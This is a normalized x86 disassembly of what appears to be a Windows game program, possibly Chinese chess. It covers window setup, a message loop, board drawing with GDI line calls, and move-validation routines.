push eax
call sub_4059c0
mov esi [ SetCursor@IAT ]
add esp 0x8
push [ rw-data ]
call esi
push edi
call sub_405bb0
add esp 0x4
push [ rw-data ]
call esi
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub eax 0x68
je r-xdata
push [ rw-data ]
call [ DeleteObject@IAT ]
push [ rw-data ]
call [ DeleteDC@IAT ]
push 0x0
call [ PostQuitMessage@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub eax 0xd
jne r-xdata
mov ecx [ ebp - 0x4 ]
add esp 0x8
xor ecx ebp
xor eax eax
pop edi
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
push 0x0
push sub_404f60
push edi
push 0x67
push [ rw-data ]
call [ DialogBoxParamW@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub eax 0x1
jne r-xdata
lea eax [ ebp - 0x12c ]
push eax
push edi
call [ BeginPaint@IAT ]
mov esi eax
lea eax [ ebp - 0xec ]
push eax
push edi
call [ GetClientRect@IAT ]
lea eax [ ebp - 0xec ]
push eax
push esi
call sub_4059c0
add esp 0x8
lea eax [ ebp - 0x12c ]
push eax
push edi
call [ EndPaint@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
push edi
call [ DestroyWindow@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub_4061d0
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi [ LoadStringW@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push 0x64
push rw-data
push 0x67
push edi
call esi
push 0x64
push rw-data
push 0x6d
push edi
call esi
push edi
call sub_4052d0
add esp 0x4
mov [ rw-data ] edi
push 0x0
push edi
push 0x0
push 0x0
push 0x0
push 0x80000000
push 0x0
push 0x80000000
push 0xc80000
push rw-data
push rw-data
push 0x0
call [ CreateWindowExW@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x10
push 0x0
push esi
call [ ShowWindow@IAT ]
push esi
call [ UpdateWindow@IAT ]
mov esi [ GetMessageW@IAT ]
lea eax [ ebp - 0x1c ]
push 0x0
push 0x0
push 0x0
push eax
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov edi [ TranslateMessage@IAT ]
push ebx
mov ebx [ DispatchMessageW@IAT ]
nop [ eax ] eax
lea eax [ ebp - 0x1c ]
push eax
call edi
lea eax [ ebp - 0x1c ]
push eax
call ebx
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call esi
test eax eax
jne r-xdata
pop ebx
sub_4062b0
push ebp
mov ebp esp
push 0xffffffff
push sub_44cecf
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ MoveToEx@IAT ]
test eax eax
je r-xdata
cmp eax 0x8
je r-xdata
mov esi eax
shl edi 0x4
add edi [ ebp + 0x10 ]
shl esi 0x4
add edi edi
add esi eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add esi esi
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push ecx
call edx
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ MoveToEx@IAT ]
mov edi [ ebp + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
shl edi 0x4
add edi [ ebp + 0x10 ]
shl esi 0x4
add edi edi
add esi eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add esi esi
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push ecx
call edx
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
push 0x1
call sub_40c364
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx eax
call sub_404e40
sub_406590
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push 0x14
call sub_4171b0
mov ecx 0x14
cdq
idiv ecx
push ecx
movd xmm0 edx
cvtdq2pd xmm0 xmm0
divsd xmm0 [ r--data ]
addsd xmm0 [ r--data ]
cvtpd2ps xmm0 xmm0
movss [ esp ] xmm0
call sub_4171b0
cdq
mov ecx 0x3e8
idiv ecx
add edx 0x1f4
push edx
call sub_4171b0
cdq
mov ecx 0x154
idiv ecx
push edx
call sub_4171b0
neg eax
mov ebx [ ebp + 0xc ]
mov ecx 0x132
cdq
idiv ecx
push edx
push ebx
push 0x154
push ecx
push [ ebp + 0x8 ]
call sub_406a70
movzx edi bl
mov eax ebx
shr eax 0x8
add esp 0x24
movzx eax al
mov esi 0xff
shr ebx 0x10
mov [ ebp + 0xc ] eax
lea edx [ edi + 0x28 ]
cmp edx esi
movzx ebx bl
lea ecx [ eax + 0x28 ]
cmovg edx esi
cmp ecx esi
cmovg ecx esi
lea eax [ ebx + 0x28 ]
cmp eax esi
cmovg eax esi
movzx esi al
shl esi 0x8
movzx eax cl
xor ecx ecx
or esi eax
movzx eax dl
shl esi 0x8
or esi eax
lea eax [ edi - 0x28 ]
test eax eax
push esi
mov esi [ CreatePen@IAT ]
cmovs eax ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
add eax 0xffffffd8
cmovs eax ecx
mov [ ebp + 0xc ] eax
xor eax eax
add ebx 0xffffffd8
push eax
push eax
cmovs ebx eax
call esi
mov edi eax
mov ecx [ ebp + 0xc ]
movzx ecx cl
movzx edx bl
shl edx 0x8
or edx ecx
mov [ ebp - 0xc ] edi
mov ecx [ ebp - 0x4 ]
shl edx 0x8
movzx ecx cl
or edx ecx
push edx
push 0x0
push 0x0
call esi
mov ebx [ ebp + 0x8 ]
push edi
push ebx
mov [ ebp - 0x8 ] eax
call [ SelectObject@IAT ]
mov edi [ LineTo@IAT ]
xor esi esi
mov [ ebp - 0x4 ] eax
nop
mov eax [ esi * 4 + r--data ]
push 0x0
add eax ecx
push eax
push [ esi * 4 + r--data ]
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax [ ebp + 0xc ]
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x110
push eax
push ebx
call edi
mov ecx [ ebp + 0xc ]
add ecx 0x22
mov [ ebp + 0xc ] ecx
cmp ecx 0x110
jle r-xdata
mov edi 0x22
nop [ eax ] eax
mov eax [ esi * 4 + r--data ]
push 0x0
push [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x88
push eax
mov eax [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ LineTo@IAT ]
mov eax [ esi * 4 + r--data ]
push 0x0
add eax 0xaa
push eax
mov eax [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ LineTo@IAT ]
add edi 0x22
cmp edi 0xee
jle r-xdata
mov eax [ esi * 4 + r--data ]
push 0x0
push [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
mov edi [ LineTo@IAT ]
add eax 0x44
push eax
mov eax [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
push 0x0
push [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x44
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
push 0x0
add eax 0xee
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
push 0x0
add eax 0xee
push eax
mov eax [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call edi
push esi
push 0x2
push 0x7
push ebx
call sub_4062b0
push esi
push 0x2
push 0x1
push ebx
call sub_4062b0
push esi
push 0x3
push 0x0
push ebx
call sub_4062b0
push esi
push 0x3
push 0x2
push ebx
call sub_4062b0
add esp 0x40
push esi
push 0x3
push 0x4
push ebx
call sub_4062b0
push esi
push 0x3
push 0x6
push ebx
call sub_4062b0
push esi
push 0x3
push 0x8
push ebx
call sub_4062b0
push esi
push 0x7
push 0x7
push ebx
call sub_4062b0
add esp 0x40
push esi
push 0x7
push 0x1
push ebx
call sub_4062b0
push esi
push 0x6
push 0x0
push ebx
call sub_4062b0
push esi
push 0x6
push 0x2
push ebx
call sub_4062b0
push esi
push 0x6
push 0x4
push ebx
call sub_4062b0
add esp 0x40
push esi
push 0x6
push 0x6
push ebx
call sub_4062b0
push esi
push 0x6
push 0x8
push ebx
call sub_4062b0
inc esi
add esp 0x20
cmp esi 0x1
jle r-xdata
push [ ebp + esi * 4 - 0xc ]
push ebx
call [ SelectObject@IAT ]
mov eax [ esi * 4 + r--data ]
push 0x0
sub eax 0x3
push eax
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x135
push eax
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
add eax 0x135
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x113
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x113
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
push ebx
call edi
push 0x0
push [ esi * 4 + r--data ]
push [ esi * 4 + r--data ]
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
push [ esi * 4 + r--data ]
push ebx
call edi
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x110
push eax
push ebx
call edi
push [ esi * 4 + r--data ]
mov eax [ esi * 4 + r--data ]
add eax 0x110
push eax
push ebx
call edi
push [ esi * 4 + r--data ]
push [ esi * 4 + r--data ]
push ebx
call edi
mov ecx 0x22
mov [ ebp + 0xc ] ecx
push [ ebp - 0x4 ]
push ebx
call [ SelectObject@IAT ]
push [ ebp - 0xc ]
mov esi [ DeleteObject@IAT ]
call esi
push [ ebp - 0x8 ]
call esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_406a70
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
push ebx
xor ecx ecx
push esi
push edi
mov [ esp + 0x14 ] ecx
cmp [ ebp + 0x10 ] ecx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
xorps xmm2 xmm2
inc ecx
mov [ esp + 0x14 ] ecx
cmp ecx [ ebp + 0x10 ]
jl r-xdata
movd xmm0 ecx
mov ecx [ ebp + 0x14 ]
mov bx cx
cvtdq2ps xmm0 xmm0
movzx eax cl
mov [ esp + 0x20 ] eax
mov eax ecx
shr bx 0x8
shr eax 0x10
mov [ esp + 0x12 ] bx
mulss xmm0 [ r--data ]
mov [ esp + 0x34 ] eax
movss [ esp + 0x24 ] xmm0
nop
xor edi edi
test eax eax
jle r-xdata
cvtps2pd xmm0 xmm0
movsd [ esp + 0x38 ] xmm0
fld [ esp + 0x38 ]
fldz
call sub_42924a
fstp [ esp + 0x1c ]
movss xmm0 [ esp + 0x1c ]
movss xmm0 [ r--data ]
jmp r-xdata
movss xmm0 [ esp + 0x1c ]
cvtps2pd xmm0 xmm0
movsd [ esp + 0x28 ] xmm0
fld [ esp + 0x28 ]
cvtps2pd xmm0 xmm1
movsd [ esp + 0x28 ] xmm0
fld [ esp + 0x28 ]
call sub_42924a
fstp [ esp + 0x28 ]
movss xmm0 [ esp + 0x28 ]
movss xmm0 [ r--data ]
jmp r-xdata
addss xmm0 [ ebp + 0x24 ]
movd xmm1 [ ebp + 0x18 ]
cvtdq2ps xmm1 xmm1
movss [ esp + 0x28 ] xmm0
addss xmm1 [ esp + 0x24 ]
cvtps2pd xmm0 xmm0
movss [ esp + 0x1c ] xmm1
call sub_429420
movss xmm1 [ esp + 0x18 ]
cvtps2pd xmm1 xmm1
mulsd xmm0 xmm1
movd xmm1 [ ebp + 0x1c ]
cvtdq2ps xmm1 xmm1
cvtsd2ss xmm0 xmm0
addss xmm0 xmm1
movss [ esp + 0x38 ] xmm0
movss xmm0 [ esp + 0x28 ]
cvtps2pd xmm0 xmm0
call sub_429260
movss xmm1 [ esp + 0x18 ]
xorps xmm2 xmm2
cvtps2pd xmm1 xmm1
mov esi [ ebp + 0x14 ]
mulsd xmm0 xmm1
movss xmm1 [ esp + 0x1c ]
mulss xmm1 xmm1
cvtsd2ss xmm2 xmm0
movd xmm0 [ ebp + 0x20 ]
cvtdq2ps xmm0 xmm0
addss xmm2 xmm0
movaps xmm0 xmm2
movss [ esp + 0x28 ] xmm2
mulss xmm0 xmm2
addss xmm1 xmm0
cvtps2pd xmm0 xmm1
call sub_4295f0
movss xmm1 [ esp + 0x28 ]
cvtsd2ss xmm0 xmm0
movss [ esp + 0x18 ] xmm0
xorps xmm0 xmm0
ucomiss xmm1 xmm0
lahf
test ah 0x44
jpe r-xdata
mov eax [ ebp + 0x28 ]
mov ecx [ esp + 0x20 ]
cdq
sub eax edx
mov edx 0x0
sar eax 0x1
sub ecx eax
cmovs ecx edx
sub ebx eax
cmovs ebx edx
mov edx [ esp + 0x1c ]
sub edx eax
mov eax 0x0
cmovs edx eax
movzx esi dl
lea eax [ edx - 0x1 ]
cmp eax 0x2
ja r-xdata
movss xmm1 [ esp + 0x38 ]
divss xmm1 [ r--data ]
mov eax [ esp + 0x34 ]
movzx eax al
movzx ebx bl
mov [ esp + 0x1c ] eax
mulss xmm0 [ r--data ]
addss xmm0 xmm1
cvtps2pd xmm0 xmm0
call sub_429420
movss xmm1 [ esp + 0x18 ]
mov ecx 0xa
mulsd xmm0 [ r--data ]
cvtps2pd xmm1 xmm1
addsd xmm0 xmm1
cvtsd2ss xmm0 xmm0
cvttss2si eax xmm0
cdq
idiv ecx
test edx edx
je r-xdata
movd xmm1 edi
cvtdq2ps xmm1 xmm1
movaps xmm0 xmm1
mulss xmm0 xmm1
addss xmm0 xmm2
cvtps2pd xmm0 xmm0
call sub_4295f0
cvtsd2ss xmm0 xmm0
xorps xmm1 xmm1
movss [ esp + 0x18 ] xmm0
movd xmm0 edi
cvtdq2ps xmm0 xmm0
ucomiss xmm0 xmm1
lahf
test ah 0x44
jpe r-xdata
mov ecx [ esp + 0x14 ]
push esi
push [ esp + 0x18 ]
push edi
push [ ebp + 0x8 ]
call [ SetPixel@IAT ]
mov eax [ ebp + 0xc ]
inc edi
mov bx [ esp + 0x12 ]
xorps xmm2 xmm2
cmp edi eax
jl r-xdata
mov edx [ ebp + 0x28 ]
mov eax 0x0
mov ecx [ esp + 0x20 ]
sub ecx edx
cmovs ecx eax
sub ebx edx
cmovs ebx eax
mov eax [ esp + 0x1c ]
sub eax edx
mov edx 0x0
cmovs eax edx
movzx esi al
jmp r-xdata
shl esi 0x8
movzx eax bl
or esi eax
movzx eax cl
shl esi 0x8
or esi eax
sub_406d30
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
movss xmm1 [ ebp + 0x8 ]
movss xmm0 [ ebp + 0x10 ]
mulss xmm0 xmm0
push ebx
mulss xmm1 xmm1
addss xmm1 xmm0
cvtps2pd xmm0 xmm1
call sub_4295f0
movss xmm1 [ ebp + 0x10 ]
ucomiss xmm1 [ r--data ]
cvtsd2ss xmm0 xmm0
lahf
movss [ esp + 0x14 ] xmm0
test ah 0x44
jpe r-xdata
movss xmm0 [ ebp + 0x8 ]
cvtps2pd xmm0 xmm0
movsd [ esp + 0x8 ] xmm0
fld [ esp + 0x8 ]
cvtps2pd xmm0 xmm1
movsd [ esp + 0x8 ] xmm0
fld [ esp + 0x8 ]
call sub_42924a
fstp [ esp + 0x8 ]
movss xmm1 [ esp + 0x8 ]
movss xmm1 [ r--data ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
cdq
sub eax edx
sar eax 0x1
lea eax [ edx - 0x1 ]
cmp eax 0x2
ja r-xdata
movss xmm0 [ ebp + 0xc ]
divss xmm0 [ r--data ]
mov ecx [ ebp + 0x14 ]
mov eax ecx
shr eax 0x8
movzx eax al
mov [ esp + 0x4 ] eax
mov eax ecx
shr eax 0x10
movzx eax al
movzx ebx cl
mov [ esp + 0x8 ] eax
mulss xmm1 [ r--data ]
addss xmm1 xmm0
cvtps2pd xmm0 xmm1
call sub_429420
movss xmm1 [ esp + 0x14 ]
mov ecx 0xa
mulsd xmm0 [ r--data ]
cvtps2pd xmm1 xmm1
addsd xmm0 xmm1
cvtsd2ss xmm0 xmm0
cvttss2si eax xmm0
cdq
idiv ecx
test edx edx
je r-xdata
mov eax [ ebp + 0x14 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x18 ]
jmp r-xdata
sub ebx eax
mov ecx 0x0
mov edx 0x0
cmovs ebx ecx
mov ecx [ esp + 0x4 ]
sub ecx eax
cmovs ecx edx
mov edx [ esp + 0x8 ]
sub edx eax
movzx ecx cl
mov eax 0x0
cmovs edx eax
movzx eax dl
shl eax 0x8
or eax ecx
movzx ecx bl
shl eax 0x8
or eax ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_406e70
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x14 ]
lea esi [ ebx * 4 + r--data ]
push edi
push esi
call sub_407600
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebx * 4 + r--data ]
mov ebx [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ ebx + eax * 4 ]
cmp eax 0x20
je r-xdata
mov edx [ ebp + 0x8 ]
jne r-xdata
cmp eax 0x7
jne r-xdata
mov eax [ esi ]
cmp eax 0xd
ja r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ ebx + eax * 4 ]
cmp eax 0x20
je r-xdata
cmp [ eax * 4 + r--data ] 0x0
jne r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x0
jne r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x7
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_407570 ]
cmp [ eax * 4 + r--data ] 0x1
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0xb
jge r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
dec ecx
mov [ rw-data ] ecx
test ecx ecx
jle r-xdata
mov edx [ ebp + 0x10 ]
mov esi [ edi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp esi ecx
jg r-xdata
mov edx [ ebp + 0x10 ]
mov ecx [ edi + 0x4 ]
mov esi [ edx + 0x4 ]
cmp ecx esi
jge r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x1
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ ecx ]
mov eax esi
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
sub eax [ edi + 0x4 ]
cdq
mov esi eax
mov eax [ edi ]
sub eax [ ecx ]
xor esi edx
sub esi edx
cdq
xor eax edx
sub eax edx
add esi eax
cmp esi 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ edi + 0x4 ]
mov edx [ eax + 0x4 ]
cmp edx esi
je r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ edi + 0x4 ]
mov edx [ ecx + 0x4 ]
cmp edx esi
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
mov esi [ ecx ]
sub eax esi
mov [ ebp - 0xc ] eax
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x4 ] eax
cmp eax 0x1
jne r-xdata
mov eax [ eax ]
lea esi [ eax + eax * 2 ]
lea eax [ ecx + esi * 4 ]
lea eax [ edx + eax * 4 ]
nop
mov eax [ eax ]
lea esi [ eax + eax * 2 ]
lea eax [ ecx + esi * 4 ]
lea eax [ edx + eax * 4 ]
nop
mov eax [ edi ]
sub ecx esi
sub eax [ edx ]
cdq
xor eax edx
sub eax edx
add eax ecx
cmp eax 0x1
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
sub eax [ ecx ]
cdq
xor eax edx
sub eax edx
cmp eax 0x1
jle r-xdata
mov eax [ ecx + 0x4 ]
mov [ ebp + 0xc ] eax
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov esi [ edi ]
mov edi [ eax ]
cmp edi esi
jge r-xdata
mov eax [ eax ]
cmp eax [ edi ]
jne r-xdata
mov edi [ edi ]
lea eax [ edi + edi * 2 ]
lea eax [ esi + eax * 4 ]
cmp [ ebx + eax * 4 ] 0x20
jne r-xdata
mov eax [ ecx ]
cmp eax [ edi ]
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0xc ] eax
sub eax ecx
mov [ ebp - 0x8 ] eax
cdq
xor eax edx
sub eax edx
cmp eax 0x2
je r-xdata
lea eax [ ecx + esi * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x0
je r-xdata
inc ecx
add eax 0x4
mov [ rw-data ] ecx
cmp ecx 0xb
jl r-xdata
lea eax [ ecx + esi * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x7
je r-xdata
dec ecx
sub eax 0x4
mov [ rw-data ] ecx
test ecx ecx
jg r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
add eax esi
cdq
sub eax edx
sar eax 0x1
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0xc ]
add eax [ edi + 0x4 ]
cdq
sub eax edx
sar eax 0x1
lea eax [ eax + ecx * 4 ]
cmp [ ebx + eax * 4 ] 0x20
je r-xdata
lea ecx [ esi + 0x1 ]
mov [ rw-data ] ecx
cmp ecx edi
jge r-xdata
lea ecx [ edi + 0x1 ]
mov [ rw-data ] ecx
cmp ecx esi
jge r-xdata
mov eax [ ebp + 0x10 ]
cmp edx esi
jne r-xdata
xor ecx ecx
cmp edx esi
jne r-xdata
cmp edx esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edi eax
mov ecx [ ecx + 0x4 ]
sub edi ecx
mov [ ebp + 0xc ] eax
mov eax edi
cdq
xor eax edx
sub eax edx
cmp eax 0x1
jne r-xdata
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
jge r-xdata
jge r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ eax ]
cmp esi edi
jge r-xdata
jge r-xdata
mov ecx [ ecx ]
cmp ecx edi
jge r-xdata
jmp r-xdata
mov eax esi
sub eax [ ebp - 0x10 ]
cmp eax 0x2
jne r-xdata
inc esi
mov [ rw-data ] ecx
mov [ rw-data ] esi
jmp r-xdata
inc ecx
add eax 0x30
